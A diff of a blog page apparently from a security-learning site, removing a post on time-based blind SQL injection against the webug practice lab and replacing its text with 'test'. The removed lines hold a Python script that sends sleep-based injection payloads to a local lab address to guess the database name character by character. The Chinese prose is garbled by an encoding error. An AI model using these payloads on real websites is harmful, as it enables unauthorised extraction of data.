@@ -79,19 +79,17 @@
 
 
 
-<meta name="description" content="����webug��ʱ��������һ��ʱ��äע���õ���mysql�еļ���������sleep(n)  #��ʱִ��length(string string) #�������ݳ���if(expr1, expr2, expr3)   #expr1Ϊ��ִ��expr2����ִ��expr3substr(string string, num start, num lengt">
+<meta name="description" content="test">
 <meta property="og:type" content="article">
 <meta property="og:title" content="timeInjection">
 <meta property="og:url" content="http://yoursite.com/2017/10/25/timeInjection/index.html">
 <meta property="og:site_name" content="h4ck2fun">
-<meta property="og:description" content="����webug��ʱ��������һ��ʱ��äע���õ���mysql�еļ���������sleep(n)  #��ʱִ��length(string string) #�������ݳ���if(expr1, expr2, expr3)   #expr1Ϊ��ִ��expr2����ִ��expr3substr(string string, num start, num lengt">
+<meta property="og:description" content="test">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/img/sqlInjection/1.png">
-<meta property="og:updated_time" content="2017-10-25T02:53:10.067Z">
+<meta property="og:updated_time" content="2017-10-25T03:00:04.165Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="timeInjection">
-<meta name="twitter:description" content="����webug��ʱ��������һ��ʱ��äע���õ���mysql�еļ���������sleep(n)  #��ʱִ��length(string string) #�������ݳ���if(expr1, expr2, expr3)   #expr1Ϊ��ִ��expr2����ִ��expr3substr(string string, num start, num lengt">
-<meta name="twitter:image" content="http://yoursite.com/img/sqlInjection/1.png">
+<meta name="twitter:description" content="test">
 
 
 
@@ -301,14 +299,7 @@
       
 
       
-        <p>����webug��ʱ��������һ��ʱ��äע���õ���mysql�еļ���������<br><code>sleep(n)</code>  #��ʱִ��<br><code>length(string string)</code> #�������ݳ���<br><code>if(expr1, expr2, expr3)</code>   #expr1Ϊ��ִ��expr2����ִ��expr3<br><code>substr(string string, num start, num length)</code>  #��start��ʼ��0,1һ������ȡstring����Ϊlength<br>����һ��д�õĽű� beautiful code !<br><img src="/img/sqlInjection/1.png" alt=""><br><a id="more"></a><br>��ʵäע�е������ڱ��� ��Ҫһ���ַ�һ���ַ���ȥ�½�<br>`#encoding=utf-8 </p>
-<p>#ʱ��äע�ű�</p>
-<p>import requests<br>import time</p>
-<p>payloads = ‘qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM0123456789@_.}{‘</p>
-<p>#�����ܳ��Ľ���<br>length=0<br>database=’’</p>
-<p>print ‘start get length…’<br>for l in range(1,21):   #�������ܵĳ��� ������һ���������ݿ��� ��ʵ�������벻ҪҲ�� ����length�����㹻���ͺ� ���Ƿϵ�ʱ��<br>    startTime1=time.time()  #��¼��ǰ��ʱ����<br>    url1 = “<a href="http://192.168.37.147/pentest/test/time/?type=1" target="_blank" rel="external">http://192.168.37.147/pentest/test/time/?type=1</a> and if(length(database())=%d,sleep(5),1)”%(l)<br>    response1 = requests.get(url1)<br>    if time.time() - startTime1 &gt; 5:    #��ǰ��ʱ������֮ǰ�ıȽ� �Ƿ�ִ����sleep(5)<br>        length=l<br>        print “the length is “ + str(length)<br>            break</p>
-<p>print ‘start database sql injection…’<br>for d in range(1,length+1):<br>    for payload in payloads:    #�����ֵ�<br>        startTime2=time.time()<br>        url2 = “<a href="http://192.168.37.147/pentest/test/time/?type=1" target="_blank" rel="external">http://192.168.37.147/pentest/test/time/?type=1</a> and if(substr(database(),’%d’,1)=’%s’,sleep(5),1)”%(d,payload)<br>        response2 = requests.get(url2) #��������<br>        if time.time() - startTime2 &gt; 5: #�ж��Ƿ���ʱ��5�� Ҳ���� �Ƿ�ִ���˺���sleep(5)<br>            database+=payload<br>            print database<br>            break<br>print “the database is “ + database```</p>
-<p>���ž����� ��ʵ�ܼ��� �Ѵ����ĸı����ж����ܳ���<br>�����е��鷳 һ��ֻ����һ������ ������ô�Զ���<br>�ؼ������λ�ȡ�ж��ٸ�������  ���������ĳ���</p>
+        <p>test</p>
 
       
     </div>
